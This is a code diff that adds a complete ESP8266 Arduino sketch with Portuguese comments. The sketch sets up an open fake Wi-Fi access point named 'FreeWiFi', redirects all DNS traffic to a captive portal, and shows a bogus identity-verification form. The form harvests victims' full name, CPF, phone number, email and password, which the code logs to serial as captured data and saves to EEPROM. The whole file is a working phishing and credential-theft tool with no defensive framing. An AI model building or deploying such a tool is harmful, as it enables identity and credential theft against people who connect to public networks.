@@ -1,0 +1,115 @@
+#include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>
+#include <DNSServer.h>
+#include <EEPROM.h>
+
+ESP8266WebServer server(80);
+DNSServer dnsServer;
+
+const byte DNS_PORT = 53;
+const char* ssid = "FreeWiFi";  // Nome do WiFi Fake
+const char* password = "";       // Senha do WiFi
+
+IPAddress apIP(192, 168, 1, 1);  // IP do ESP8266 no modo AP
+
+void setup() {
+  Serial.begin(115200);
+
+  // Configura o ponto de acesso Wi-Fi fake
+  WiFi.softAP(ssid, password);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  Serial.println("WiFi Fake criado e aguardando conexões...");
+
+  // Inicializa o DNS para capturar todas as requisições e redirecionar para o Captive Portal
+  dnsServer.start(DNS_PORT, "*", apIP);
+
+  // Inicializa a EEPROM para armazenar os dados
+  EEPROM.begin(512);
+
+  // Rota para exibir a página de captura de informações
+  server.onNotFound(handleRoot);  // Qualquer página não encontrada redireciona para o root
+  server.on("/", handleRoot);  // Página principal
+  server.on("/submit", HTTP_POST, handleFormSubmit);  // Submissão do formulário
+
+  // Inicia o servidor web HTTP
+  server.begin();
+  Serial.println("Servidor web iniciado via HTTP, esperando dados...");
+}
+
+void loop() {
+  // Processa requisições DNS e HTTP
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
+
+void handleRoot() {
+  // Adiciona cabeçalhos HTTP para melhorar a compatibilidade com dispositivos móveis
+  server.sendHeader("Connection", "close");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.sendHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+  server.sendHeader("Pragma", "no-cache");
+  server.sendHeader("Expires", "-1");
+
+  // HTML da página de captura de informações (servindo via HTTP)
+  String page = "<html><head>";
+  page += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
+  page += "<title>Verificação de Identidade</title></head><body>";
+  page += "<h1>preencha o formulario para se conectar</h1>";
+  page += "<form method='POST' action='/submit'>";
+  page += "Nome Completo: <input type='text' name='nome'><br>";
+  page += "CPF: <input type='text' name='cpf'><br>";
+  page += "Numero de Celular: <input type='text' name='celular'><br>";
+  page += "Email: <input type='email' name='email'><br>";
+  page += "Senha: <input type='password' name='senha'><br><br>";
+  page += "<input type='submit' value='Enviar'>";
+  page += "</form></body></html>";
+  
+  server.send(200, "text/html", page);
+}
+
+void handleFormSubmit() {
+  // Coleta os dados do formulário
+  String nome = server.arg("nome");
+  String cpf = server.arg("cpf");
+  String celular = server.arg("celular");
+  String email = server.arg("email");
+  String senha = server.arg("senha");
+
+  // Exibe os dados capturados de forma organizada no Monitor Serial
+  Serial.println("===== Dados Capturados =====");
+  Serial.println("Nome Completo: " + nome);
+  Serial.println("CPF: " + cpf);
+  Serial.println("Número de Celular: " + celular);
+  Serial.println("Email: " + email);
+  Serial.println("Senha: " + senha);
+  Serial.println("=============================");
+
+  // Salva os dados na EEPROM
+  saveDataToEEPROM(nome, cpf, celular, email, senha);
+
+  // Responde com uma mensagem de sucesso
+  server.send(200, "text/html", "<h1>Dados enviados com sucesso!</h1>");
+}
+
+// Função para salvar os dados na EEPROM
+void saveDataToEEPROM(String nome, String cpf, String celular, String email, String senha) {
+  int addr = 0;
+
+  // Função auxiliar para salvar strings na EEPROM
+  addr = saveStringToEEPROM(nome, addr);
+  addr = saveStringToEEPROM(cpf, addr);
+  addr = saveStringToEEPROM(celular, addr);
+  addr = saveStringToEEPROM(email, addr);
+  addr = saveStringToEEPROM(senha, addr);
+
+  EEPROM.commit();  // Salva os dados na EEPROM
+}
+
+// Função auxiliar para salvar uma string na EEPROM
+int saveStringToEEPROM(String data, int addr) {
+  for (int i = 0; i < data.length(); i++) {
+    EEPROM.write(addr++, data[i]);
+  }
+  EEPROM.write(addr++, '\0');  // Adiciona um caractere nulo para marcar o fim da string
+  return addr;
+}
